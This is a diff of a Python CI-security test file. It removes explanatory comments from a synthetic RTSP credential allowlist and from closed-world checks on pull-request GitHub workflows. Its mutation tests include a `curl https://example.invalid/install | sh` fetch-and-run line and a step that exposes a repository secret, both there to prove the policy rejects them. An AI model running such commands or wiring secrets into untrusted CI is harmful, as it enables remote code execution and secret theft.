@@ -110,28 +110,16 @@ _APPROVED_DOCUMENTATION_ART_SHA256 = (
 )
 _APPROVED_DOCUMENTATION_ART_SIZE = 168_648
 _SYNTHETIC_RTSP_FIXTURES = {
-    # 엣지 브링업 스킬의 두 URL 은 값이 아니라 변수 보간이다. 자격증명이 문자열
-    # 안에 들어 있는 게 아니라 실행 시점에 환경변수에서 온다. 허용 목록이 정확한
-    # 문자열로 매칭되니, 누군가 나중에 여기에 실제 비밀번호를 박아 넣으면 문자열이
-    # 달라져 가드가 그대로 잡는다 — 예외가 파일 전체로 번지지 않는다.
     Path(".claude/skills/edge-bringup/references/worker-roster.md"): {
         "rtsp://{CAM_USER}:{CAM_PASSWORD}@{camera_ip}:554/trackID=2",
-        # <사용자>/<비밀번호>/<카메라 IP> 도 값이 아니라 사람이 채워 넣을 자리
-        # 표시자다. 호스트 자리표시자에 공백이 있어(`<카메라 IP>`) 정규식이
-        # 호스트를 `<카메라` 에서 끊어 매칭한다.
         "rtsp://<사용자>:<비밀번호>@<카메라",
     },
     Path(".claude/skills/edge-bringup/scripts/rtsp_sweep.sh"): {
         "rtsp://${CAM_USER}:${CAM_PASSWORD}@${ip}:554/${TRACK}",
     },
     Path("tests/test_alert_amplification_harness.py"): {
-        # 스캐너가 자격증명 포함 RTSP URL 을 거부하는지 증명하는 입력값이다.
-        # 실제 카메라가 아니라 거부되어야 하는 형태를 보여주는 합성 리터럴.
         "rtsp://user:pass@camera/live",
     },
-    # 이슈 #325: ffmpeg stderr 진단을 로그로 올릴 때 자격증명이 절대 렌더링되지
-    # 않는지 증명하는 합성 입력이다. 실제 카메라가 아니라, 마스킹되어야 하는
-    # 형태 그 자체가 테스트 대상이다.
     Path("tests/test_worker_nvdec_process.py"): {
         "rtsp://admin:secret@camera/token=abc",
     },
@@ -161,9 +149,6 @@ _SYNTHETIC_RTSP_FIXTURES = {
     Path("front/src/features/cameras/CameraCard.test.tsx"): {
         "rtsp://user:****@camera.local/stream",
     },
-    # 세 IDIS 서브스트림 안내 테스트의 fixture. 192.0.2.10 은 실제 카메라가
-    # 아니라 문서용 TEST-NET-1 주소(RFC 5737)이고 admin:pw 는 고정 더미
-    # 자격증명이다.
     Path("front/src/features/settings/CameraEditModal.test.tsx"): {
         "rtsp://admin:pw@192.0.2.10:554/trackID=1",
     },
@@ -190,9 +175,6 @@ _SYNTHETIC_RTSP_FIXTURES = {
         "rtsp://admin:newpass@cam.local/stream",
     },
     Path("tests/test_camera_api.py"): {
-        # camera.example 는 문서용(RFC 2606) 예약 도메인이고 operator:private 는
-        # 고정 더미 자격증명이다 -- 실제 카메라나 비밀이 아니다. 이 테스트는 이
-        # 자격증명이 토폴로지 응답에서 절대 새지 않음을 증명한다.
         "rtsp://operator:private@camera.example/live",
     },
     Path("tests/test_camera_roster_sync.py"): {
@@ -210,9 +192,6 @@ _SYNTHETIC_RTSP_FIXTURES = {
         "rtsp://***:***@host/stream?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
     },
     Path("tests/test_postgres_cameras.py"): {
-        # PostgreSQL 카메라 저장소가 자격증명을 마스킹하고, 자격증명만 다른 URL 을
-        # 같은 스트림으로 식별하는지 증명하는 입력값이다. 호스트는 모두 예약
-        # 도메인(.invalid, RFC 2606)이고 자격증명은 고정 더미 값이다.
         "rtsp://operator:synthetic-private@camera.invalid/live",
         "rtsp://***:***@redacted-camera/live",
         "rtsp://original:secret@camera-a.invalid/live/?a=1&b=2",
@@ -238,34 +217,20 @@ _SYNTHETIC_RTSP_FIXTURES = {
         "rtsp://***:***@host/stream?profile=%2A%2A%2A&username=%2A%2A%2A&secret=%2A%2A%2A",
     },
     Path("tests/test_analysis_timeline.py"): {
-        # URL 모양이라는 이유만으로 컴포넌트 식별자에서 거부됨을 증명하는 픽스처.
-        # user:secret 는 고정 더미이고 자격증명 자체는 검증 대상이 아니다.
         "rtsp://user:secret@camera/model",
     },
     Path("tests/test_edge_topology_contract.py"): {
-        # bed-exit e2e 스크립트가 BED_EXIT_RTSP_URL 을 dry-run 출력에서
-        # `rtsp://<redacted>` 로 마스킹함을 증명한다. camera-1.local 은
-        # 예약 .local 이고 camera-user:camera-secret 는 고정 더미다.
         "rtsp://camera-user:camera-secret@camera-1.local/trackID=2",
     },
     Path("tests/test_rtsp_url_policy.py"): {
-        # camera.example/cam.example 는 문서용(RFC 2606) 예약 도메인이고
-        # user:pass 는 고정 더미 자격증명이다. 이 테스트들은 userinfo 가 핀 고정
-        # 과정에서 보존되고 정책이 URL 을 올바르게 허용/거부함을 증명한다.
         "rtsp://user:pass@camera.example:8554/path?subtype=0",
         "rtsp://user:pass@cam.example:8554/live?x=1",
-        # cam.example 이 8.8.8.8 로 핀 고정된 뒤의 pinned_url -- userinfo 보존 확인.
         "rtsp://user:pass@8.8.8.8:8554/live?x=1",
     },
     Path("tests/test_runtime_manifest.py"): {
-        # camera.local 은 예약 .local 이고 admin:secret 는 고정 더미다. 이
-        # 테스트는 자격증명 URL 이 매니페스트 직렬화에 절대 포함되지 않음을 증명한다.
         "rtsp://admin:secret@camera.local/live",
     },
     Path("tests/test_worker_mjpeg_server.py"): {
-        # 8.8.8.8 은 admission DNS 핀 고정이 성공하도록 쓰는 공개 IP 이고
-        # user:secret 는 고정 더미다. 이 테스트들은 probe URL/자격증명이 응답에
-        # 절대 새지 않음을 증명한다.
         "rtsp://user:secret@8.8.8.8/trackID=2",
     },
     Path("tests/test_decode_seam_nvdec_subprocess.py"): {
@@ -289,8 +254,6 @@ _SYNTHETIC_RTSP_FIXTURES = {
         "rtsps://operator:not-a-fixture@camera.example/stream",
         "rtsps://operator:secret@camera.example/stream",
     },
-    # Native-frame grab tests prove the credentialed URL never reaches a log or
-    # an error message; the fixture must therefore carry a (fake) credential.
     Path("tests/test_rtsp_native_frame.py"): {
         "rtsp://user:secret@camera.example/stream",
     },
@@ -500,14 +463,6 @@ PUBLIC_SAFE_STRUCTURED_FIXTURES = frozenset(
 
 PUBLIC_SAFE_CONTRACT_FIXTURES = frozenset(
     {
-        # edge-provisioning-v1's request/response contract fixtures. This
-        # JSON document trips the identity+evidence-field heuristic below
-        # (it has both "camera_id" and "label" keys, coincidentally --
-        # topology-snapshot request bodies use both) even though it is a
-        # synthetic API-contract corpus, not recorded footage metadata. The
-        # file's own metadata.redaction field is checked below so a future
-        # edit that starts embedding real values changes that string and the
-        # guard catches it again -- the exemption doesn't silently widen.
         Path("contracts/edge-provisioning-v1/contract-fixtures.json"),
     }
 )
@@ -529,19 +484,12 @@ def _is_public_safe_contract_fixture(relative: Path, blob: bytes) -> bool:
     return metadata.get("redaction") == _CONTRACT_FIXTURE_REDACTION_NOTICE
 
 
-# Python-worker wire goldens recorded for the Rust worker port. Their wire
-# contract carries both "camera_id" and "facility_id", which trips the
-# two-identity-field heuristic below even though every value is synthetic.
-# The exemption holds only while every camera_id/facility_id value anywhere in
-# the JSON document comes from this allowlist and no resident_id/subject_id key
-# exists, so a recorded real identifier still trips the guard.
 _WORKER_WIRE_FIXTURE_ROOT = ("tests", "fixtures", "worker-wire")
 _WORKER_WIRE_SYNTHETIC_IDENTIFIERS = {
     "camera_id": frozenset(
         {
             "camera-replay",
             "camera-replay-http",
-            # Synthetic cuid from tests/test_worker_relay_payload_contract.py.
             "cmsnw6rjc01vhlh01oswn99yq",
         }
     ),
@@ -622,10 +570,6 @@ def _is_public_safe_structured_fixture(relative: Path, blob: bytes) -> bool:
 
 
 def _is_prohibited_path(relative: Path) -> bool:
-    # Exact-path exemption only -- explicitly named-safe fixtures (see
-    # PUBLIC_SAFE_STRUCTURED_FIXTURES's docstring above) bypass the path-part
-    # guardrail below without weakening it for anything else under a
-    # prohibited directory like `models/`.
     if relative in PUBLIC_SAFE_STRUCTURED_FIXTURES:
         return False
     lowered_parts = {part.lower() for part in relative.parts}
@@ -696,8 +640,6 @@ def test_tracked_text_contains_no_embedded_secret_or_media_payload() -> None:
             "\n".join(["# " + "A" * 64] * 8),
             "url-safe-or-wrapped-base64",
         ),
-        # Deliberately assembled at runtime so this file never matches its own
-        # scanner; ruff's implicit-concat rewrite must not rejoin it.
         ("8950" + "4e470d0a1a0a" + "00" * 32, "hex-encoded-media-signature"),
         (
             "rtsps://operator:not-a-fixture@camera.example/stream",
@@ -869,50 +811,6 @@ def _workflow(name: str) -> dict[str, object]:
     return loaded
 
 
-# ci.yml is an UNTRUSTED workflow: `pull_request` makes it execute fork-authored
-# code on a runner that also holds a checkout of this repository. The
-# closed-world allowlist below is the control that keeps that safe. Every job,
-# every ordered step, and every action pin is matched exactly, so a step added
-# to public CI has to be *declared* here rather than inferred, and the mutation
-# tests underneath prove the allowlist still bites.
-#
-# The job graph grew from one serial `test` job to `secrets` / `lint` / `test`
-# (a 4-way shard matrix) / `ci-ok`, and `push` is now restricted to `main` so a
-# PR no longer runs this workflow twice on the identical commit. Splitting the
-# work does not relax the contract -- each job carries its own exact step
-# allowlist, and `ci-ok` is the single job branch protection points at.
-#
-# Two obvious speedups stay deliberately OFF, and this is the file that keeps
-# them off: `actions/cache` is forbidden outright and setup-uv keeps
-# `enable-cache: false`.
-#
-# The reason recorded in aa5e2c0 -- that a poisoned fork-PR cache entry would be
-# restored by a later trusted run on `main` -- is WRONG, and correcting it does
-# not change the policy. GitHub's cache documentation says the opposite in so
-# many words: "When a cache is created by a workflow run triggered on a pull
-# request, the cache is created for the merge ref (refs/pull/.../merge).
-# Because of this, the cache will have a limited scope and can only be restored
-# by re-runs of the pull request. It cannot be restored by the base branch or
-# other pull requests targeting that base branch." GitHub's own low-trust cache
-# hardening -- which does make `pull_request_target`, `issue_comment` and
-# `workflow_run` read-only against the default branch's cache scope -- then
-# states plainly: "The `pull_request` event is not affected."
-# (https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
-# The poisoning direction the old comment described does not exist.
-#
-# The honest reasons the ban stays:
-#   * It buys a PR no wall clock. `ci-ok` is not this repository's critical
-#     path -- the required `Build edge ML images + boot smoke` check is -- so
-#     even a perfect uv cache saves 0s of PR wall clock.
-#   * There is nothing to save anyway: on a runner `uv sync` is ~21s and the
-#     model fetch is ~900KB / ~1s.
-#   * Cache capacity is already the binding constraint. The repository's Actions
-#     cache is past its 10 GB limit (10.7 GiB measured), almost all of it
-#     BuildKit blobs for the DeepStream layers, and entries are being evicted
-#     mid-run. A uv cache would evict image layers whose rebuild costs minutes
-#     to save seconds.
-#   * And a closed-world allowlist is cheaper to keep closed than to reason
-#     about per entry.
 _ACTION_PIN = re.compile(r"^[^@]+@[0-9a-f]{40}$")
 
 _CHECKOUT_STEP = {
@@ -925,8 +823,6 @@ _SETUP_UV_STEP = {
     "with": {"enable-cache": "false", "version": "0.11.27"},
 }
 
-# gitleaks needs only the checked-out tree and docker -- no uv, no apt, no
-# models -- so it is its own job and starts reporting in seconds.
 _SECRETS_STEPS = [
     _CHECKOUT_STEP,
     {
@@ -940,15 +836,6 @@ _SECRETS_STEPS = [
     },
 ]
 
-# Static checks. This job deliberately carries NO apt step and NO model fetch:
-# ruff, import-linter, verify_scope_fidelity.py and `docker compose config` read
-# the repo tree and nothing else, so the ~28s ffmpeg/fonts install and the model
-# download buy it nothing. Scope fidelity runs a tracked in-repo Python script
-# over this same checkout: it greps for env-provisioned facility identity and
-# camera roster residue, fetches nothing, reads no secret, starts no container,
-# and re-checks out no other repository. The compose step only renders config
-# from the tracked, placeholder-only .env.edge.prod.example (never the
-# gitignored real .env.edge.prod), pulls no images and starts no containers.
 _LINT_STEPS = [
     _CHECKOUT_STEP,
     _SETUP_UV_STEP,
@@ -987,18 +874,9 @@ _LINT_STEPS = [
             "  -f compose.edge.yaml config -q\n"
         ),
     },
+    {"run": "uv run --group lint python scripts/check_no_comments.py"},
 ]
 
-# The shard's file discovery, byte for byte. Kept as its own constant because
-# `test_shard_partition_is_an_exact_cover_of_the_suite` re-derives the very same
-# partition in Python and asserts it covers the tracked suite exactly: the
-# regex, the exclusion and the round-robin below are the shell half of that
-# contract, and the assertions further down fail the moment the two disagree.
-#
-# `tests/test_*.py`, the pathspec this shard started with, was NOT what pytest
-# collects: pytest's `python_files` default is `test_*.py` *and* `*_test.py` at
-# any depth, so `tests/foo_test.py` or `tests/unit/test_x.py` would have run in
-# no shard at all while `ci-ok` stayed green.
 _SHARD_DISCOVERY = (
     "mapfile -t shard_files < <(\n"
     "  git ls-files -- '*.py' |\n"
@@ -1011,20 +889,6 @@ _SHARD_DISCOVERY = (
 )
 
 
-# The whole cost centre: pytest was 18m27s of a 19m37s run. fonts-noto-cjk
-# provisions the same real CJK glyph file the runtime image installs
-# (Dockerfile.edge); it is a plain distro apt package that fetches no other
-# repository, reads no secret, starts no container and re-checks out nothing, so
-# it stays admissible under this closed-world contract.
-#
-# The marker filter deselects the original three markers plus `private_bundle`
-# (CI fetches no model weights); it fails when selected without models/, so the
-# filter is the one place it is left out. Sharding is a deterministic
-# round-robin over the sorted *tracked* test files, which is why it adds no
-# dependency to uv.lock -- pytest-split or pytest-xdist would each add one, and
-# a new PyPI dependency resolved at CI time in an untrusted workflow is exactly
-# the supply-chain surface this file exists to bound. If a shard ever collects
-# nothing the step fails loudly rather than passing empty.
 _TEST_STEPS = [
     _CHECKOUT_STEP,
     _SETUP_UV_STEP,
@@ -1039,11 +903,6 @@ _TEST_STEPS = [
     {"run": "uv sync --frozen --group lint"},
     {
         "name": "Run test shard ${{ matrix.shard }} of 4",
-        # The matrix value is passed through `env:` and read back as `$SHARD`.
-        # Interpolating `${{ matrix.shard }}` into the script body splices
-        # expression text into the shell source before bash parses it; `$SHARD`
-        # is a value the shell reads, never source it compiles. The DSN points
-        # at the job's own postgres service below and carries no credential.
         "env": {
             "SHARD": "${{ matrix.shard }}",
             "SEEON_TEST_POSTGRES_DSN": "postgresql://postgres@127.0.0.1:5432/seeon_test",
@@ -1064,9 +923,6 @@ _TEST_STEPS = [
 ]
 
 
-# Branch protection points at this one job. `needs` alone is not enough under
-# `if: always()`: a skipped or cancelled dependency would let it pass, so every
-# dependency's result is asserted explicitly.
 _CI_OK_STEPS = [
     {
         "name": "Assert every required job succeeded",
@@ -1088,11 +944,6 @@ _CI_OK_STEPS = [
     },
 ]
 
-# Every job carries `timeout-minutes`. Without it a job inherits GitHub's
-# 6-hour default, so one wedged step burns a runner for six hours and, on a PR,
-# holds the required `ci-ok` check pending for just as long. The budgets are
-# sized to the work: `secrets` and `ci-ok` do seconds of work, `lint` a few
-# minutes, and a shard about five.
 _EXPECTED_JOBS: dict[str, dict[str, object]] = {
     "secrets": {
         "runs-on": "ubuntu-latest",
@@ -1108,13 +959,10 @@ _EXPECTED_JOBS: dict[str, dict[str, object]] = {
         "runs-on": "ubuntu-latest",
         "timeout-minutes": "30",
         "strategy": {
-            # One shard's failure must not hide the other shards' results.
             "fail-fast": "false",
             "matrix": {"shard": ["1", "2", "3", "4"]},
         },
         "env": {"SHARD_TOTAL": "4"},
-        # The only admitted service: a digest-pinned image that cannot be
-        # repointed, trust auth with no secret, published only on the job runner.
         "services": {
             "postgres": {
                 "image": (
@@ -1143,21 +991,14 @@ _EXPECTED_JOBS: dict[str, dict[str, object]] = {
 
 
 def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
-    # `concurrency` is the only top-level key added to the original
-    # {jobs, name, on, permissions} set; anything else (env, defaults, a
-    # workflow-level secret) still fails here.
     assert set(workflow) == {"concurrency", "jobs", "name", "on", "permissions"}
 
-    # `push` is branch-filtered to main so a PR stops running this workflow
-    # twice (once for push, once for pull_request) on the identical commit.
     assert workflow["on"] == {
         "pull_request": "",
         "push": {"branches": ["main"]},
     }
     assert workflow["permissions"] == {"contents": "read"}
 
-    # Superseded PR runs are cancelled; main runs are never cancelled, so the
-    # default branch keeps an unbroken status history.
     assert workflow["concurrency"] == {
         "group": "ci-${{ github.workflow }}-${{ github.ref }}",
         "cancel-in-progress": "${{ github.event_name == 'pull_request' }}",
@@ -1170,8 +1011,6 @@ def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
     for name, expected in _EXPECTED_JOBS.items():
         job = jobs[name]
         assert isinstance(job, dict), name
-        # Exact key set: no job may add `permissions`, `container`,
-        # `continue-on-error`, `if`, `env`, or a self-hosted runner.
         assert set(job) == set(expected), name
         assert job == expected, name
 
@@ -1179,12 +1018,9 @@ def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
         assert isinstance(steps, list), name
         for step in steps:
             assert isinstance(step, dict), name
-            # Every action is pinned to a full 40-hex commit SHA -- a tag or a
-            # branch would let the upstream repository change under us.
             if "uses" in step:
                 assert _ACTION_PIN.match(str(step["uses"])), (name, step["uses"])
 
-    # CI downloads no model weights: no fetch step anywhere, no HF_TOKEN.
     assert "fetch-models" not in yaml.safe_dump(jobs)
     assert "HF_TOKEN" not in yaml.safe_dump(jobs)
     assert "${{ secrets." not in yaml.safe_dump(jobs["test"])
@@ -1195,7 +1031,6 @@ def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
     assert ".dataset-ops" not in serialized
     assert "upload-artifact" not in serialized
     assert "actions/cache" not in serialized
-    # Every PR-reachable job is secret-free.
     assert "${{ secrets." not in serialized
     for job_name, job in jobs.items():
         if _NOT_A_PULL_REQUEST_IF not in str(job.get("if", "")):
@@ -1215,23 +1050,16 @@ def test_untrusted_ci_has_no_private_repository_access() -> None:
 @pytest.mark.parametrize(
     ("job", "step_index", "field", "value"),
     [
-        # Unpinned actions, in every job that uses one.
         ("secrets", 0, "uses", "actions/checkout@v4"),
         ("lint", 0, "uses", "actions/checkout@v4"),
         ("lint", 1, "uses", "astral-sh/setup-uv@v5"),
         ("test", 0, "uses", "actions/checkout@v4"),
         ("test", 1, "uses", "astral-sh/setup-uv@v5"),
-        # An unpinned gitleaks image is the same class of hole as an unpinned
-        # action: the tag can be moved under us.
         ("secrets", 1, "run", "echo gitleaks@sha256:placeholder"),
-        # Fetching and running an external binary from the network.
         ("lint", 2, "run", "curl https://example.invalid/install | sh"),
         ("test", 2, "run", "curl https://example.invalid/install | sh"),
-        # Swapping a locked, audited toolchain for an ad-hoc resolve.
         ("lint", 3, "run", "uvx ruff check ."),
-        # Silently widening what the shard actually runs.
         ("test", 4, "run", "uv run pytest -q tests/"),
-        # The gate must not be turned into a no-op.
         ("ci-ok", 0, "run", "true"),
     ],
 )
@@ -1254,14 +1082,11 @@ def test_untrusted_ci_policy_rejects_security_mutations(
 @pytest.mark.parametrize(
     ("field", "value"),
     [
-        # Re-widening `push` reinstates the duplicate run per PR.
         ("on", {"push": "", "pull_request": ""}),
         ("on", {"push": {"branches": ["main"]}, "pull_request": {"paths": ["src/**"]}}),
         ("permissions", {"contents": "write"}),
         ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
         ("defaults", {"run": {"shell": "bash"}}),
-        # Cancelling in-progress runs on main would break the default branch's
-        # status history.
         ("concurrency", {"group": "ci", "cancel-in-progress": "true"}),
     ],
 )
@@ -1287,8 +1112,6 @@ def test_untrusted_ci_policy_rejects_removed_job() -> None:
     workflow = copy.deepcopy(_workflow("ci.yml"))
     jobs = workflow["jobs"]
     assert isinstance(jobs, dict)
-    # Dropping a job from the graph must not silently pass; `ci-ok` is what
-    # branch protection watches, so losing `secrets` has to be caught here.
     del jobs["secrets"]
 
     with pytest.raises(AssertionError):
@@ -1304,10 +1127,6 @@ def test_untrusted_ci_policy_rejects_cache_step(job: str) -> None:
     assert isinstance(target, dict)
     steps = target["steps"]
     assert isinstance(steps, list)
-    # Not a poisoning gate (a `pull_request` run's entries are scoped to
-    # `refs/pull/<n>/merge` and no `main` run can restore them). The ban is a
-    # capacity and altitude decision -- see the block above `_ACTION_PIN` -- and
-    # this test is what keeps a step from re-introducing it by hand.
     steps.append(
         {
             "uses": "actions/cache@0000000000000000000000000000000000000000",
@@ -1327,7 +1146,6 @@ def test_untrusted_ci_policy_rejects_uv_cache_opt_in() -> None:
     assert isinstance(lint, dict)
     steps = lint["steps"]
     assert isinstance(steps, list)
-    # setup-uv's own cache is the same Actions cache backend as actions/cache.
     steps[1]["with"]["enable-cache"] = "true"
 
     with pytest.raises(AssertionError):
@@ -1365,65 +1183,29 @@ def test_untrusted_ci_policy_rejects_shard_matrix_change() -> None:
     assert isinstance(job, dict)
     strategy = job["strategy"]
     assert isinstance(strategy, dict)
-    # The shard count in the matrix and the `SHARD_TOTAL` the step partitions
-    # by must move together, or shards silently stop covering the whole suite.
     strategy["matrix"] = {"shard": ["1", "2"]}
 
     with pytest.raises(AssertionError):
         _assert_untrusted_ci_security(workflow)
 
 
-# ---------------------------------------------------------------------------
-# Closed-world policy for EVERY workflow `pull_request` can trigger.
-#
-# `_assert_untrusted_ci_security` above pins ci.yml step by step, but ci.yml is
-# not the only workflow a fork-authored commit starts. edge-images.yml also runs
-# `on: pull_request` -- it is the repository's second required status check, it
-# builds a PR's own Dockerfiles, and on the publishing paths it holds
-# `packages: write` and logs in to ghcr.io. The assertions below therefore apply
-# to whatever set of workflows actually carries that trigger. The set is
-# *discovered* from the tracked tree rather than listed, so a workflow that
-# grows an `on: pull_request` later is covered the moment it is committed, not
-# the day somebody remembers to add it here.
-# ---------------------------------------------------------------------------
-
 _WORKFLOW_DIR = Path(".github/workflows")
 
-#: The `if:` that keeps a step off a pull_request run. PUSH_IMAGES is the env
-#: var carrying the condition; the two constants below are the only two shapes
-#: the gate is allowed to take.
 _PUSH_GATE = "env.PUSH_IMAGES == 'true'"
 _PUSH_GATE_EXPR = "${{ env.PUSH_IMAGES == 'true' }}"
 _CACHE_GATE_PREFIX = "${{ env.PUSH_IMAGES == 'true' && "
 _CACHE_GATE_SUFFIX = " || '' }}"
-#: ...and this is what makes PUSH_IMAGES mean "not a pull request" at all.
 _NOT_A_PULL_REQUEST = "${{ github.event_name != 'pull_request' }}"
 _NOT_A_PULL_REQUEST_IF = "github.event_name != 'pull_request'"
 
-#: Shell markers for a step that writes to the container registry without a
-#: `push:` input. Per-image release isolation adds a tag to an already-published
-#: manifest instead of rebuilding it; that is a registry write and needs the
-#: same gate as a push.
 _REGISTRY_WRITE_MARKERS = ("imagetools create", "edge_image_plan.py retag", "docker push")
 
 _EDGE_DOCKERFILE = "Dockerfile.edge"
 
-#: The two mutually exclusive boot-smoke shapes. A freshly built non-release
-#: image is loaded directly into Docker; a reused or release digest is
-#: pulled and run. Their `if:` expressions must stay exact complements, or a run
-#: could skip both and the required check would pass having booted nothing.
 _SMOKE_STAGE_IF = "env.BUILD_ML_WORKER == 'true' && env.RELEASE_BUILD != 'true'"
 _SMOKE_PULL_IF = "env.BUILD_ML_WORKER != 'true' || env.RELEASE_BUILD == 'true'"
 _LOCAL_SMOKE_REF = 'SMOKE_REF="$IMAGE_NAMESPACE/ml-worker:$DEPLOY_SHA"'
 
-#: The only (workflow, job) pair permitted to hold a write scope while its
-#: workflow is reachable from `pull_request`, and the exact scopes it may hold.
-#: `permissions:` accepts no expression (GitHub community discussion #53915) and
-#: this job is the required `Build edge ML images + boot smoke` check, so it
-#: cannot be hidden behind an `if:` either -- a skipped job is scored as green by
-#: branch protection, which would turn the gate into a silent pass. The grant is
-#: therefore bounded on the token's consumers instead, which is what
-#: `_assert_token_consumers_are_gated` checks.
 _WRITE_PERMISSION_HOLDERS: dict[tuple[str, str], set[str]] = {
     ("edge-images.yml", "publish"): {"packages"},
 }
@@ -1442,7 +1224,6 @@ def _tracked_workflows() -> dict[str, dict[str, object]]:
 
 
 def _trigger_names(workflow: dict[str, object]) -> set[str]:
-    # BaseLoader keeps the key as the string "on"; it resolves no YAML 1.1 bools.
     triggers = workflow["on"]
     if isinstance(triggers, dict):
         return set(triggers)
@@ -1457,9 +1238,6 @@ def _pull_request_workflows() -> dict[str, dict[str, object]]:
         for name, workflow in _tracked_workflows().items()
         if "pull_request" in _trigger_names(workflow)
     }
-    # Discovery must never quietly come back empty. Both required status checks
-    # run on `pull_request`, so if either is missing here the walk broke -- the
-    # exposure did not go away.
     assert {"ci.yml", "edge-images.yml"} <= set(found), sorted(found)
     return found
 
@@ -1481,12 +1259,6 @@ def _steps(job: dict[str, object]) -> list[dict[str, object]]:
 
 
 def _count_pinned_actions(name: str, workflow: dict[str, object]) -> int:
-    """Every `uses:` in a PR-reachable workflow names an immutable commit.
-
-    A tag or a branch is a mutable pointer the upstream owner can move, and this
-    workflow runs on a fork's commit with a checkout of this repository on the
-    runner.
-    """
     pinned = 0
     for job_name, job in _jobs(workflow).items():
         for step in _steps(job):
@@ -1498,12 +1270,6 @@ def _count_pinned_actions(name: str, workflow: dict[str, object]) -> int:
 
 
 def _assert_no_pull_request_secret_access(name: str, workflow: dict[str, object]) -> None:
-    """No repository secret is readable on a pull_request run of this workflow.
-
-    A job whose own `if:` excludes pull_request cannot start on one, so it may
-    read a secret; everything else -- including the workflow-level keys, which
-    apply to every job -- may not.
-    """
     top_level = {key: value for key, value in workflow.items() if key != "jobs"}
     assert "${{ secrets." not in yaml.safe_dump(top_level), name
     for job_name, job in _jobs(workflow).items():
@@ -1513,7 +1279,6 @@ def _assert_no_pull_request_secret_access(name: str, workflow: dict[str, object]
 
 
 def _assert_token_consumers_are_gated(name: str, job_name: str, job: dict[str, object]) -> None:
-    """Nothing in a write-scoped job can spend the token on a pull_request run."""
     env = job.get("env")
     assert isinstance(env, dict), (name, job_name)
     assert env.get("PUSH_IMAGES") == _NOT_A_PULL_REQUEST, (name, job_name, env)
@@ -1540,18 +1305,8 @@ def _assert_token_consumers_are_gated(name: str, job_name: str, job: dict[str, o
         if "cache-to" in with_:
             exports += 1
             cache_to = str(with_["cache-to"])
-            # Not a poisoning gate either (a `pull_request` run's BuildKit cache
-            # is scoped to `refs/pull/<n>/merge` and no `main` run can restore
-            # it). A PR exports nothing because the export measured 413.3s on
-            # push run 33154567502, helps only the NEXT run, and evicts
-            # DeepStream blobs from a cache already past its 10 GB limit.
-            # Gated, this collapses to the empty string on a PR run.
             assert cache_to.startswith(_CACHE_GATE_PREFIX), (name, step.get("name"), cache_to)
             assert cache_to.endswith(_CACHE_GATE_SUFFIX), (name, step.get("name"), cache_to)
-        # Per-image release isolation re-tags an already-published digest rather
-        # than rebuilding it. That writes to the registry just as a `push:`
-        # does, so it is a token consumer and carries the same gate. It is a
-        # `run:` step, so the `with:`-shaped checks above cannot see it.
         if any(marker in str(step.get("run", "")) for marker in _REGISTRY_WRITE_MARKERS):
             retags += 1
             assert _PUSH_GATE in str(step.get("if", "")), (
@@ -1560,11 +1315,6 @@ def _assert_token_consumers_are_gated(name: str, job_name: str, job: dict[str, o
                 step.get("if"),
             )
 
-    # Non-vacuous: these are the shapes this job contains -- one registry login,
-    # one artifact upload, two `push:` inputs, two `cache-to` exports, two
-    # digest re-tags, and one local-image boot smoke. Deleting a gate cannot pass by
-    # deleting its step, and deleting the smoke cannot pass by leaving nothing
-    # to check.
     assert (logins, uploads, pushes, exports, retags, smokes) == (1, 1, 2, 2, 2, 1), (
         name,
         job_name,
@@ -1576,8 +1326,6 @@ def _assert_write_permissions_stay_off_the_pull_request_path(
     name: str, workflow: dict[str, object]
 ) -> None:
     permissions = workflow.get("permissions")
-    # Workflow-level permissions apply to every job, including any added later,
-    # so no write scope may live there.
     assert isinstance(permissions, dict), (name, permissions)
     assert not [scope for scope, level in permissions.items() if level != "read"], (
         name,
@@ -1603,8 +1351,6 @@ def test_every_pull_request_workflow_pins_actions_to_a_commit() -> None:
         _count_pinned_actions(name, workflow)
         for name, workflow in _pull_request_workflows().items()
     )
-    # ci.yml (5) + edge-images.yml (6). A floor, not an
-    # equality: adding a pinned step must not have to touch this number.
     assert pinned >= 11, pinned
 
 
@@ -1618,11 +1364,6 @@ def test_pull_request_workflows_grant_no_write_scope_they_can_spend() -> None:
         _assert_write_permissions_stay_off_the_pull_request_path(name, workflow)
 
 
-#: The publish job's steps, in order, as (step name fragment, `uses` prefix or
-#: None for a `run:` step). The tests below address steps by index, and an index
-#: that silently points at the wrong step still "passes" -- it just stops
-#: testing anything. Pinning the sequence turns a reorder into a failure here
-#: instead of into a quiet hole there.
 _PUBLISH_STEP_SEQUENCE: tuple[tuple[str, str | None], ...] = (
     ("", "actions/checkout@"),
     ("Resolve deploy SHA", None),
@@ -1637,8 +1378,6 @@ _PUBLISH_STEP_SEQUENCE: tuple[tuple[str, str | None], ...] = (
     ("Re-tag the published ml-api", None),
     ("Re-tag the published ml-worker", None),
     ("Resolve the digests", None),
-    # ...and its complement, for a reused or release digest, which has to pull
-    # the published bytes and therefore stays a `run:`.
     ("Boot smoke test", None),
     ("Write edge image env artifact", None),
     ("Upload edge image refs", "actions/upload-artifact@"),
@@ -1673,8 +1412,6 @@ _HOSTED_RUNNER_DISK_STEP = {
 def _assert_bounded_hosted_runner_disk_preparation(workflow: dict[str, object]) -> None:
     steps = _steps(_jobs(workflow)["publish"])
     capacity = [step for step in steps if step.get("name") == _HOSTED_RUNNER_DISK_STEP["name"]]
-    # Closed-world equality rejects broader paths, interpolated targets, a
-    # weakened hosted/Linux guard, missing df evidence, and extra commands.
     assert capacity == [_HOSTED_RUNNER_DISK_STEP], capacity
     assert steps.index(capacity[0]) == 2
 
@@ -1871,39 +1608,21 @@ def test_edge_image_storage_invalid_config_is_never_overwritten(
 
 
 def test_the_required_edge_image_check_is_never_gated_off() -> None:
-    """The gate must report on every pull request.
-
-    Branch protection scores a REQUIRED check that never reports as green, so a
-    `paths:` filter on the trigger or an `if:` that can exclude a pull request
-    from the publish job would silently disable the gate rather than fail it.
-    Per-image isolation therefore decides INSIDE the job -- this test is what
-    stops the decision from migrating out to a filter.
-    """
     workflow = _workflow("edge-images.yml")
     triggers = workflow["on"]
     assert isinstance(triggers, dict)
     pull_request = triggers["pull_request"]
